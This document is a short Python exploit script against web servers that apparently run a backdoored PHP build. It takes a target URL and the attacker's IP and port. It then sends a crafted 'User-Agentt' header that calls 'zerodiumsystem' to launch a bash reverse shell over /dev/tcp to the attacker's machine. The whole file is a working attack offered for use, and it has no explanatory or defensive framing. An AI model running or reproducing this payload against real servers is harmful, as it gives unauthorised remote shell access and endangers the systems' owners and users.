#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url (http://host/): ")
ip = input("Enter Your IP : ")
port = input("Enter Your Port: ")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    try:
        headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "User-Agentt": "zerodiumsystem('/bin/bash -c \"bash -i >&/dev/tcp/{}/{} 0>&1\"');".format(ip,port)
        }
        response = request.get(host, headers = headers, allow_redirects = False)
    except (KeyboardInterrupt):
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
